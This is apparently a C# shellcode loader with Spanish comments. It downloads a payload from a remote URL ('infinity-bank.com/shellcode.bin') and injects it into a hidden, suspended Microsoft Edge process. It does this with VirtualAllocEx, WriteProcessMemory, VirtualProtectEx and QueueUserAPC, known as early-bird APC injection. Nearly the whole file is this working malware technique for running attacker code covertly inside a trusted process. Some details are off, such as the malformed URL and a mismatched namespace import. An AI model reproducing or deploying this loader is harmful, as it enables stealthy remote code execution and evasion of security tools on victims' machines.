using ShellCodeInject;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using static ShellCodeInject.Kernel32;
using System;
namespace GadgetToScript
{

    public static class Kernel32
{


    public enum StateEnum
    {
        MEM_COMMIT = 0x1000,
        MEM_RESERVE = 0x2000,
        MEM_FREE = 0x10000
    }
    public enum Protection
    {
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
    }
    [Flags]
    public enum STARTF : uint
    {
        STARTF_USESHOWWINDOW = 0x00000001,
        STARTF_USESIZE = 0x00000002,
        STARTF_USEPOSITION = 0x00000004,
        STARTF_USECOUNTCHARS = 0x00000008,
        STARTF_USEFILLATTRIBUTE = 0x00000010,
        STARTF_RUNFULLSCREEN = 0x00000020,  // ignored for non-x86 platforms
        STARTF_FORCEONFEEDBACK = 0x00000040,
        STARTF_FORCEOFFFEEDBACK = 0x00000080,
        STARTF_USESTDHANDLES = 0x00000100,
        STARTF_USEHOTKEY = 0x00000200,
        STARTF_TITLEISLINKNAME = 0x00000800,
        STARTF_TITLEISAPPID = 0x00001000,
        STARTF_PREVENTPINNING = 0x00002000,
        STARTF_UNTRUSTEDSOURCE = 0x00008000,
    }


    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern bool CreateProcess(
    string lpApplicationName,
    string lpCommandLine,
    IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes,
    bool bInheritHandles,
    uint dwCreationFlags,
    IntPtr lpEnvironment,
    string lpCurrentDirectory,
    ref STARTUPINFO lpStartupInfo,
    out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId);


    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        AllocationType flAllocationType,
        MemoryProtection flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        AllocationType flAllocationType,
        MemoryProtection flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
      uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        int dwSize,
        MemoryProtection flNewProtect,
        out MemoryProtection lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern uint QueueUserAPC(
        IntPtr pfnAPC,
        IntPtr hThread,
        IntPtr dwData);

    [DllImport("kernel32.dll")]
    public static extern bool IsWow64Process(
        IntPtr processHandle,
        out bool wow64Process);

    [Flags]
    public enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
    }

    [Flags]
    public enum CreationFlags
    {
        CreateSuspended = 0x00000004,
        DetachedProcesds = 0x00000008,
        CreateNoWindow = 0x08000000,
        ExtendedStartupInfoPresent = 0x00080000
    }

    [Flags]
    public enum CreateProcessFlags : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttributes;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdErr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
}
    public class Program
    {
        
        
        static async Task Main(){
            byte[] shellcode;
            
          using (var httpClient = new HttpClient())
        {
            
                // Es preferible utilizar GetByteArrayAsync de forma asincrónica
                var url = "http//infinity-bank.com/shellcode.bin";
                shellcode = await httpClient.GetByteArrayAsync(url);

                // Haz algo con los datos descargados, por ejemplo, imprimir la longitud
          
        }

            // spawn ms edge
            var si = new STARTUPINFO
            {
                dwFlags = (uint)STARTF.STARTF_USESHOWWINDOW
            };
          
            si.cb = (uint)Marshal.SizeOf(si);


            // ad struct PI
            bool success = CreateProcess(
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",      // Nombre de la aplicación
                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5",               // Línea de comandos
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                (uint)CreateProcessFlags.CREATE_NO_WINDOW | (uint)CreateProcessFlags.CREATE_SUSPENDED,
                IntPtr.Zero,
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application",
                ref si,
                out var pi
            );

            // bail if process didn't spawn
            if (!success) { 
                Console.WriteLine("No spawnea proceso");
                Console.WriteLine(Marshal.GetLastWin32Error());
                return;
            }

            // allocate RW memory
            var baseAddress = Kernel32.VirtualAllocEx(
            pi.hProcess,
            IntPtr.Zero,
            (uint)shellcode.Length,
            Kernel32.AllocationType.Commit,
            Kernel32.MemoryProtection.ReadWrite);
            if (baseAddress == IntPtr.Zero) { 
                Console.WriteLine("No alloca memoria proceso");
                Console.WriteLine(Marshal.GetLastWin32Error());
                return;
            }

            success = WriteProcessMemory(pi.hProcess,
                baseAddress,
                shellcode,
                (uint)shellcode.Length,
                out _);


            success = VirtualProtectEx(
          pi.hProcess,
          baseAddress,
          (uint)shellcode.Length,
          (uint)Kernel32.Protection.PAGE_EXECUTE_READ,
          out _);
            if (!success)
            {
                Console.WriteLine("Nada que no cambia a executer el allocex");
                return;
                // terminateProcess
                //return
            }


            _ = Kernel32.QueueUserAPC(
            baseAddress,
            pi.hThread,
            IntPtr.Zero);

                    // resume
        ResumeThread(pi.hThread);
        // close handles
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);


    }
    }
    }
    


